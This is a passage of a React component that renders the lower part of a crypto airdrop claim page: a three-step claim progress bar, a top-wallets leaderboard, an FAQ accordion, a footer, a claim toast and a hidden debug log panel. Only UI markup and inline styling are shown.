            <div style={{ marginTop: 32, paddingTop: 24, borderTop: '1px solid rgba(30,41,59,0.8)', display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 8, textAlign: 'center', fontSize: 11, fontWeight: 600, letterSpacing: 1, textTransform: 'uppercase', color: '#64748b' }}>
              <span style={{ color: activeStep >= 1 ? '#818cf8' : '#64748b' }}>1. Check Eligibility</span>
              <span style={{ color: activeStep >= 2 ? '#818cf8' : '#64748b' }}>2. Accept Terms</span>
              <span style={{ color: activeStep >= 3 ? '#818cf8' : '#64748b' }}>3. Claim Tokens</span>
            </div>
          </div>

          {/* Right panel: Leaderboard */}
          <div style={{ backgroundColor: '#131a26', border: '1px solid #1e293b', borderRadius: 16, padding: 24, boxShadow: '0 25px 50px -12px rgba(0,0,0,0.4)', display: 'flex', flexDirection: 'column', height: 415 }}>
            <div style={{ marginBottom: 16, display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', borderBottom: '1px solid rgba(30,41,59,0.6)', paddingBottom: 12 }}>
              <div>
                <span style={{ display: 'block', fontSize: 10, fontWeight: 700, color: '#818cf8', textTransform: 'uppercase', letterSpacing: 2 }}>Dashboard Activity</span>
                <strong style={{ fontSize: 16, fontWeight: 700, color: '#fff' }}>Top Claimed Wallets</strong>
              </div>
              <TrendingUp size={16} color="#64748b" />
            </div>
            <ol className="custom-scrollbar" style={{ flex: 1, overflowY: 'auto', listStyle: 'none', margin: 0, padding: '0 4px 0 0', display: 'flex', flexDirection: 'column', gap: 8, fontSize: 14, fontFamily: 'monospace' }}>
              {LEADERBOARD_DATA.map(item => (
                <li key={item.rank} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderRadius: 12, border: item.rank <= 3 ? '1px solid rgba(99,102,241,0.15)' : '1px solid transparent', backgroundColor: item.rank <= 3 ? 'rgba(99,102,241,0.08)' : 'transparent' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                    <span style={{ width: 20, textAlign: 'center', fontSize: 13, fontWeight: 700, color: getRankColor(item.rank) }}>{item.rank}</span>
                    <span style={{ color: '#cbd5e1', fontSize: 13 }}>{item.address}</span>
                  </div>
                  <strong style={{ fontSize: 13, color: '#fff', fontWeight: 700 }}>{item.amount}</strong>
                </li>
              ))}
            </ol>
          </div>
        </div>

        {/* FAQ */}
        <section style={{ maxWidth: 896, margin: '0 auto', borderTop: '1px solid rgba(30,41,59,0.6)', paddingTop: 48 }}>
          <div style={{ textAlign: 'center', marginBottom: 32 }}>
            <span style={{ fontSize: 12, fontWeight: 700, color: '#818cf8', textTransform: 'uppercase', letterSpacing: 2 }}>FAQ</span>
            <h2 style={{ fontSize: 24, fontWeight: 700, color: '#fff', margin: '4px 0 0' }}>About This Airdrop</h2>
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            {FAQ_DATA.map((item, idx) => (
              <div key={idx} style={{ backgroundColor: '#131a26', border: '1px solid rgba(30,41,59,0.8)', borderRadius: 12, overflow: 'hidden' }}>
                <button onClick={() => setOpenFaqIndex(openFaqIndex === idx ? null : idx)} style={{ width: '100%', padding: '16px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', textAlign: 'left', fontWeight: 600, fontSize: 14, color: '#e2e8f0', background: 'none', border: 'none', cursor: 'pointer' }}>
                  <span>{item.q}</span>
                  <ChevronDown size={14} color="#64748b" style={{ transform: openFaqIndex === idx ? 'rotate(180deg)' : 'rotate(0)', transition: 'transform 0.3s' }} />
                </button>
                <div style={{ maxHeight: openFaqIndex === idx ? 200 : 0, overflow: 'hidden', transition: 'max-height 0.3s' }}>
                  <p style={{ padding: '0 20px 16px', fontSize: 13, color: '#94a3b8', lineHeight: 1.6, borderTop: openFaqIndex === idx ? '1px solid rgba(30,41,59,0.4)' : 'none', margin: 0, paddingTop: openFaqIndex === idx ? 12 : 0 }}>{item.a}</p>
                </div>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer style={{ width: '100%', borderTop: '1px solid rgba(30,41,59,0.6)', backgroundColor: 'rgba(2,6,23,0.4)', fontSize: 12, color: '#64748b', padding: '24px 0' }}>
        <div style={{ maxWidth: 1280, margin: '0 auto', padding: '0 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 16 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
            <span>powered by</span>
            <span style={{ color: '#cbd5e1', fontWeight: 700, display: 'flex', alignItems: 'center', gap: 2 }}><Zap size={10} color="#818cf8" /> magna</span>
          </div>
          <nav style={{ display: 'flex', alignItems: 'center', gap: 24 }}>
            <a href="#" style={{ color: '#64748b', textDecoration: 'none' }}>Terms</a>
            <a href="#" style={{ color: '#64748b', textDecoration: 'none' }}>Privacy Policy</a>
            <span style={{ color: '#475569' }}>2026 © All rights reserved.</span>
          </nav>
        </div>
      </footer>

      {/* Toast */}
      <div style={{ position: 'fixed', bottom: 24, right: 24, backgroundColor: '#0f172a', border: '1px solid rgba(99,102,241,0.3)', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.6)', borderRadius: 12, padding: 16, display: 'flex', alignItems: 'flex-start', gap: 12, maxWidth: 320, transform: toastVisible ? 'translateY(0)' : 'translateY(96px)', opacity: toastVisible ? 1 : 0, transition: 'all 0.5s', zIndex: 100, pointerEvents: toastVisible ? 'auto' : 'none' }}>
        <div style={{ padding: 8, backgroundColor: 'rgba(99,102,241,0.1)', borderRadius: 8, color: '#818cf8' }}><Share2 size={14} /></div>
        <div>
          <strong style={{ display: 'block', fontSize: 12, color: '#fff', fontWeight: 700 }}>New claim processed</strong>
          <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace', marginTop: 2, display: 'block' }}>{toastMessage}</span>
        </div>
      </div>

      {/* Hidden debug panel */}
      <div style={{ display: 'none' }}>
        <div>--- SYSTEM LOGS ---</div>
        {debugLogs.map((msg, i) => <div key={i}>{msg}</div>)}
        <p>{status}</p>
        <p>{txHash}</p>
      </div>
    </div>
  )
}